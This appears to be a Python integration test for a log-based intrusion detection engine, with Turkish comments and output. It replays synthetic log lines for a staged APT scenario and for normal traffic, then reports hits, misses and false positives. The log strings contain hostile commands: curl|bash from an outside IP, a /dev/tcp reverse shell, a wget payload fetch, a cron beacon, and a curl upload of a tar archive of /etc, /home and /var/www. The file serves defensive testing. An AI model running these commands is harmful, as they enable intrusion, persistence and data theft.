from __future__ import annotations
"""
tests/integration/simulation_apt.py
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Full APT scenario simulation

Phase 1 — Recon & Access      : First-seen IP, SSH brute force, successful login
Phase 2 — Initial Foothold    : Web shell, reverse shell, LOLBin tool download
Phase 3 — Privilege Escalation: sudo recon, sudo su, root session
Phase 4 — Persistence         : Crontab backdoor, systemd service, SSH key
Phase 5 — Lateral Movement    : Internal SSH, alternate target, root cross-host
Phase 6 — Exfiltration & C2   : Shadow read, tar compression, curl upload
Normal Traffic                : Routine SSH, apt, systemd heartbeat (FP check)
"""

import sys
import time
import logging
from pathlib import Path
from typing import List, Dict
from dataclasses import dataclass, field
from collections import defaultdict

sys.path.insert(0, str(Path(__file__).parent.parent))

from core.normalize import Normalizer, NormalizedEvent
from core.detection import DetectionEngine, DetectionResult
from core.ml.label_engine import LabelEngine

logging.basicConfig(level=logging.WARNING)

# ── Colors ───────────────────────────────────────────────────────────────────
R="\033[91m"; O="\033[93m"; Y="\033[33m"; G="\033[92m"
C="\033[96m"; B="\033[94m"; M="\033[95m"; DIM="\033[2m"; RST="\033[0m"
SEV_COLOR = {"critical":R,"high":O,"medium":Y,"low":G}

# ── Result ───────────────────────────────────────────────────────────────────
@dataclass
class SimResult:
    phase:    str
    step:     str
    log_line: str
    event:    object
    alerts:   List[DetectionResult] = field(default_factory=list)
    missed:   bool = False

# ── Scenario ─────────────────────────────────────────────────────────────────
def _ts(off=0):
    return time.strftime("Mar 11 %H:%M:%S", time.gmtime(time.time()-3600+off))

SCENARIO = [
    # Phase 1 — Recon & Access
    dict(phase="FAZ 1 — Keşif & Giriş", step="1a. İlk görülen IP (first_seen)",
         log=lambda: f"{_ts(0)} web-srv sshd[2201]: Invalid user admin from 185.220.101.45 port 55234",
         src="/var/log/auth.log", expect="FIRST"),

    dict(phase="FAZ 1 — Keşif & Giriş", step="1b. SSH Brute Force",
         log=lambda: f"{_ts(2)} web-srv sshd[2202]: Failed password for root from 185.220.101.45 port 55235 ssh2",
         src="/var/log/auth.log", expect="THR", repeat=8),

    dict(phase="FAZ 1 — Keşif & Giriş", step="1c. Başarılı giriş (brute force sonrası)",
         log=lambda: f"{_ts(15)} web-srv sshd[2210]: Accepted password for www-data from 185.220.101.45 port 55244 ssh2",
         src="/var/log/auth.log", expect="SEQ"),

    # Phase 2 — Initial Foothold
    dict(phase="FAZ 2 — İlk Tutunma", step="2a. Web shell — curl | bash",
         log=lambda: f"{_ts(30)} web-srv sshd[2210]: child process 3301 (www-data) exec /bin/bash -c 'curl -s http://185.220.101.45:8080/shell.sh | bash'",
         src="/var/log/auth.log", expect="REGEX"),

    dict(phase="FAZ 2 — İlk Tutunma", step="2b. Reverse shell — /dev/tcp",
         log=lambda: f"{_ts(35)} web-srv sudo[3302]: www-data : command not allowed ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=bash -i >& /dev/tcp/185.220.101.45/4444 0>&1",
         src="/var/log/auth.log", expect="REGEX"),

    dict(phase="FAZ 2 — İlk Tutunma", step="2c. LOLBin — wget araç indirme",
         log=lambda: f"{_ts(40)} web-srv sshd[3310]: child process 3310 (www-data) exec /usr/bin/wget -O /tmp/.x http://185.220.101.45:8080/privesc",
         src="/var/log/auth.log", expect="LOL"),

    # Phase 3 — Privilege Escalation
    dict(phase="FAZ 3 — Yetki Yükseltme", step="3a. sudo -l keşfi (beklenti yok)",
         log=lambda: f"{_ts(60)} web-srv sudo[3400]: www-data : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=list",
         src="/var/log/auth.log", expect=None),

    dict(phase="FAZ 3 — Yetki Yükseltme", step="3b. sudo su ile root",
         log=lambda: f"{_ts(65)} web-srv sudo[3401]: www-data : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/su -",
         src="/var/log/auth.log", expect="ATK-PE"),

    dict(phase="FAZ 3 — Yetki Yükseltme", step="3c. Su başarılı",
         log=lambda: f"{_ts(67)} web-srv su[3402]: Successful su for root by www-data",
         src="/var/log/auth.log", expect="ATK-PE"),

    # Phase 4 — Persistence
    dict(phase="FAZ 4 — Kalıcılık", step="4a. Crontab backdoor",
         log=lambda: f"{_ts(90)} web-srv CRON[3500]: (root) CMD (curl -s http://185.220.101.45/beacon | bash)",
         src="/var/log/syslog", expect="REGEX"),

    dict(phase="FAZ 4 — Kalıcılık", step="4b. Systemd servis kurulumu",
         log=lambda: f"{_ts(95)} web-srv systemd[1]: Created symlink /etc/systemd/system/multi-user.target.wants/svc-update.service \u2192 /etc/systemd/system/svc-update.service.",
         src="/var/log/syslog", expect="ATK-PER"),

    dict(phase="FAZ 4 — Kalıcılık", step="4c. Root SSH public key ile giriş",
         log=lambda: f"{_ts(100)} web-srv sshd[3600]: Accepted publickey for root from 185.220.101.45 port 55300 ssh2: RSA SHA256:FAKEHASH",
         src="/var/log/auth.log", expect=None),

    # FAZ 5 — LATERAL MOVEMENT
    dict(phase="FAZ 5 — Lateral Movement", step="5a. web-srv → db-srv SSH (deploy)",
         log=lambda: f"{_ts(120)} db-srv sshd[3700]: Accepted password for deploy from 10.0.0.10 port 22 ssh2",
         src="/var/log/auth.log", expect="ATK-LM"),

    dict(phase="FAZ 5 — Lateral Movement", step="5b. web-srv → app-srv SSH (deploy)",
         log=lambda: f"{_ts(125)} app-srv sshd[3701]: Accepted password for deploy from 10.0.0.10 port 22 ssh2",
         src="/var/log/auth.log", expect="ATK-LM"),

    dict(phase="FAZ 5 — Lateral Movement", step="5c. Root ile lateral movement",
         log=lambda: f"{_ts(130)} db-srv sshd[3702]: Accepted password for root from 10.0.0.10 port 22 ssh2",
         src="/var/log/auth.log", expect="ATK-LM"),

    # Phase 6 — Exfiltration
    dict(phase="FAZ 6 — Exfiltration & C2", step="6a. /etc/shadow okuma (audit — beklenti yok)",
         log=lambda: f"{_ts(150)} web-srv audit[3800]: type=SYSCALL msg=audit(1234.56:789): arch=c000003e syscall=2 success=yes exit=3 exe=/bin/cat",
         src="/var/log/audit/audit.log", expect=None),

    dict(phase="FAZ 6 — Exfiltration & C2", step="6b. Tar ile veri sıkıştırma",
         log=lambda: f"{_ts(155)} web-srv sshd[3810]: child process 3810 (root) exec /bin/tar czf /tmp/.data.tgz /etc /home /var/www",
         src="/var/log/auth.log", expect="LOL"),

    dict(phase="FAZ 6 — Exfiltration & C2", step="6c. Curl ile C2 upload",
         log=lambda: f"{_ts(160)} web-srv sshd[3820]: child process 3820 (root) exec /usr/bin/curl -X POST -F data=@/tmp/.data.tgz http://185.220.101.45:9090/upload",
         src="/var/log/auth.log", expect="LOL"),

    # Normal traffic — false-positive check
    dict(phase="NORMAL TRAFİK", step="N1. Rutin SSH (admin, bilinen IP)",
         log=lambda: f"{_ts(200)} web-srv sshd[4000]: Accepted publickey for admin from 192.168.1.5 port 22 ssh2",
         src="/var/log/auth.log", expect=None),

    dict(phase="NORMAL TRAFİK", step="N2. apt-get güncelleme",
         log=lambda: f"{_ts(210)} web-srv apt[4100]: Installed: openssl (3.0.2-0ubuntu1.15)",
         src="/var/log/dpkg.log", expect=None),

    dict(phase="NORMAL TRAFİK", step="N3. Systemd servis heartbeat",
         log=lambda: f"{_ts(220)} web-srv systemd[1]: nginx.service: Scheduled restart job, restart counter is at 0.",
         src="/var/log/syslog", expect=None),
]

# ── Simulator ────────────────────────────────────────────────────────────────
class APTSimulator:

    def __init__(self):
        self.normalizer = Normalizer(distro_family="debian")
        self.engine = DetectionEngine(
            config={"rules_dir":"rules","rules_source":"yaml"},
            allow_empty_rules=False, distro_family="debian"
        )
        self.label_engine = LabelEngine(distro_family="debian", labels_dir="data/labels")
        self.label_engine.initialize()
        self.results: List[SimResult] = []
        self.all_alerts: List[DetectionResult] = []
        self._phase_stats = defaultdict(lambda: {"steps":0,"alerts":0,"missed":0,"fp":0})

    def _run_step(self, step: Dict) -> SimResult:
        repeat   = step.get("repeat", 1)
        src      = step.get("src", "/var/log/auth.log")
        expect   = step.get("expect")
        all_alerts = []
        last_event = None

        for i in range(repeat):
            line  = step["log"]()
            event = self.normalizer.normalize(line, src)
            if event is None:
                continue
            last_event = event
            alerts = self.engine.analyze(event, current_phase=0)
            all_alerts.extend(alerts)
            for a in alerts:
                self.label_engine.on_alert({
                    "rule_id":  a.rule_id, "severity": a.severity,
                    "score":    a.score,   "category": getattr(a,"category",""),
                    "entity":   getattr(event,"src_ip","") or getattr(event,"user",""),
                    "ioc_match": False,
                })

        if last_event is None:
            last_event = NormalizedEvent()

        missed = bool(expect and not any(a.rule_id.startswith(expect) for a in all_alerts))
        result = SimResult(phase=step["phase"], step=step["step"],
                           log_line=step["log"](), event=last_event,
                           alerts=all_alerts, missed=missed)
        self.results.append(result)
        self.all_alerts.extend(all_alerts)
        return result

    def run(self):
        print(f"\n{C}{'═'*72}{RST}")
        print(f"{C}  🛡  AegisCore APT Simülasyonu — Tam Senaryo{RST}")
        print(f"{C}{'═'*72}{RST}\n")

        cur_phase = None
        for step in SCENARIO:
            if step["phase"] != cur_phase:
                cur_phase = step["phase"]
                col = M if "FAZ" in cur_phase else DIM
                print(f"\n{col}{'─'*60}{RST}")
                print(f"{col}  {cur_phase}{RST}")
                print(f"{col}{'─'*60}{RST}")

            r = self._run_step(step)
            ps = self._phase_stats[r.phase]
            ps["steps"] += 1
            ps["alerts"] += len(r.alerts)
            if r.missed: ps["missed"] += 1

            # Alerts during normal traffic count as false positives
            if "NORMAL" in r.phase and r.alerts:
                ps["fp"] += len(r.alerts)

            self._print_step(r, step.get("expect"))

        self._print_summary()

    def _print_step(self, r: SimResult, expect):
        if r.missed:
            status = f"{R}✗ MISS{RST}"
        elif r.alerts:
            status = f"{G}✓ HIT {RST}"
        else:
            status = f"{DIM}·     {RST}"

        print(f"\n  {status} {B}{r.step}{RST}")
        print(f"  {DIM}Log : {r.log_line[:80]}{'...' if len(r.log_line)>80 else ''}{RST}")

        if r.event:
            parts = []
            if r.event.action  and r.event.action  != "unknown": parts.append(f"action={r.event.action}")
            if r.event.src_ip:   parts.append(f"src={r.event.src_ip}")
            if r.event.user:     parts.append(f"user={r.event.user}")
            if r.event.outcome and r.event.outcome != "unknown": parts.append(f"outcome={r.event.outcome}")
            if r.event.process:  parts.append(f"process={r.event.process}")
            if parts:
                print(f"  {DIM}Parse: {' | '.join(parts)}{RST}")

        for a in r.alerts:
            col = SEV_COLOR.get(a.severity, RST)
            print(f"  {col}  [{a.severity.upper():8}] {a.rule_id:22} score={a.score:3.0f}  {a.message[:50]}{RST}")

        if not r.alerts and not r.missed and expect:
            print(f"  {DIM}  → Beklenen prefix '{expect}' — alert üretilmedi{RST}")
        elif r.missed:
            print(f"  {R}  ⚠  Beklenen prefix '{expect}' — tetiklenmedi!{RST}")

    def _print_summary(self):
        print(f"\n\n{C}{'═'*72}{RST}")
        print(f"{C}  ÖZET RAPOR{RST}")
        print(f"{C}{'═'*72}{RST}\n")

        print(f"  {'FAZ':<38} {'ADIM':>4} {'ALERT':>6} {'MISS':>5} {'FP':>4}")
        print(f"  {'─'*38} {'─'*4} {'─'*6} {'─'*5} {'─'*4}")
        for phase, st in self._phase_stats.items():
            mc = R if st["missed"] else G
            fc = R if st["fp"] else G
            print(f"  {phase[:38]:<38} {st['steps']:>4} {st['alerts']:>6} "
                  f"{mc}{st['missed']:>5}{RST} {fc}{st['fp']:>4}{RST}")

        # Severity distribution
        sev: Dict[str,int] = defaultdict(int)
        for a in self.all_alerts:
            sev[a.severity] += 1
        print(f"\n  Severity Dağılımı:")
        for s in ["critical","high","medium","low"]:
            cnt = sev.get(s, 0)
            bar = "█" * min(cnt, 30)
            print(f"  {SEV_COLOR.get(s,RST)}  {s:10} {cnt:4}  {bar}{RST}")

        # Most frequently triggered
        rule_cnt: Dict[str,int] = defaultdict(int)
        for a in self.all_alerts:
            rule_cnt[a.rule_id] += 1
        top = sorted(rule_cnt.items(), key=lambda x: x[1], reverse=True)[:8]
        if top:
            print(f"\n  En Çok Tetiklenen Kurallar:")
            for rid, cnt in top:
                print(f"  {B}  {rid:30}{RST} {cnt:3}x")

        # Genel
        total_s = sum(s["steps"]  for s in self._phase_stats.values())
        total_a = sum(s["alerts"] for s in self._phase_stats.values())
        total_m = sum(s["missed"] for s in self._phase_stats.values())
        total_f = sum(s["fp"]     for s in self._phase_stats.values())
        # Calculate the detection rate while excluding normal-traffic steps
        attack_steps = sum(s["steps"] for p,s in self._phase_stats.items() if "NORMAL" not in p)
        attack_miss  = sum(s["missed"] for p,s in self._phase_stats.items() if "NORMAL" not in p)
        det_rate = (attack_steps - attack_miss) / attack_steps * 100 if attack_steps else 0

        print(f"\n  {'─'*40}")
        print(f"  Toplam adım          : {total_s}")
        print(f"  Toplam alert         : {total_a}")
        miss_col = G if total_m == 0 else (Y if total_m <= 3 else R)
        print(f"  Tespit edilemeyen    : {miss_col}{total_m}{RST}")
        fp_col = G if total_f == 0 else R
        print(f"  Yanlış alarm (FP)    : {fp_col}{total_f}{RST}")
        det_col = G if det_rate >= 80 else (Y if det_rate >= 60 else R)
        print(f"  Saldırı tespit oranı : {det_col}{det_rate:.0f}%{RST}  (normal trafik hariç)")

        # LabelEngine
        le = self.label_engine.status()
        print(f"\n  LabelEngine:")
        print(f"    Synthetic weight   : {le['sources']['synthetic']['weight']:.3f}")
        print(f"    Auto etiket        : {le['sources']['auto_labeled']['count']}")
        print(f"    Kalibrasyon nokt.  : {le['calibration_points']}")

        print(f"\n{C}{'═'*72}{RST}\n")

        if total_m > 0:
            print(f"{Y}  MISS Analizi:{RST}")
            for r in self.results:
                if r.missed:
                    print(f"    {R}✗{RST} {r.step}")
                    a = r.event.action if r.event else "?"
                    p = r.event.process if r.event else "?"
                    print(f"      → parse: action={a}, process={p}")
            print()


if __name__ == "__main__":
    APTSimulator().run()
